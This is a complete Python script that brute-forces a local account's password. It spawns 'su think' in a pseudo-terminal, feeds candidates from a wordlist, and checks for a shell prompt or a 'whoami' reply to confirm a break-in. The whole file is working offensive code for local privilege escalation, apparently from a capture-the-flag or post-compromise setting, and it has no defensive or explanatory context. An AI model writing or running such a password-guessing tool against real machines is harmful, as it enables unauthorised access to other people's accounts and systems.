#!/usr/bin/env python3

import os
import pty
import time

USERNAME = "think"
WORDLIST = "pwm.txt"
DELAY = 0.5       # pause between attempts
READ_BYTES = 4096
SLEEP_AFTER_SEND = 0.5

def try_password(pw: str) -> bool:
    pid, master = pty.fork()
    if pid == 0:
        # child: replace with su
        os.execvp("su", ["su", USERNAME])
    # parent: interact on master fd
    try:
        # wait a short time for the "Password:" prompt to appear
        time.sleep(0.2)
        try:
            data = os.read(master, READ_BYTES).decode("utf-8", "ignore")
        except OSError:
            data = ""
        # if no obvious prompt, keep reading briefly
        if "Password" not in data:
            time.sleep(0.3)
            try:
                data += os.read(master, READ_BYTES).decode("utf-8", "ignore")
            except OSError:
                pass

        # send the candidate password
        os.write(master, (pw + "\n").encode())

        # give the child a moment to respond
        time.sleep(SLEEP_AFTER_SEND)
        out = ""
        try:
            out = os.read(master, READ_BYTES).decode("utf-8", "ignore")
        except OSError:
            pass

        # quick checks for failure or success
        if "Authentication failure" in out or "authentication failure" in out or "su: " in out:
            return False

        # if we see a shell prompt char (# or $) or the username echoed by whoami, assume success
        if ("\n# " in out) or ("\n$ " in out):
            return True

        # ask whoami to confirm, then read reply
        os.write(master, b"whoami\n")
        time.sleep(0.2)
        try:
            who = os.read(master, READ_BYTES).decode("utf-8", "ignore")
        except OSError:
            who = ""
        return USERNAME in who

    finally:
        # cleanup: close PTY and avoid leaving child zombies
        try:
            os.close(master)
        except Exception:
            pass
        try:
            os.waitpid(pid, 0)
        except Exception:
            pass

def main():
    if not os.path.exists(WORDLIST):
        print("wordlist not found:", WORDLIST)
        return

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            pw = line.strip()
            if not pw:
                continue
            print("Trying:", pw)
            if try_password(pw):
                print("[+] FOUND:", pw)
                return
            time.sleep(DELAY)
    print("Done — no password found.")

if __name__ == "__main__":
    main()
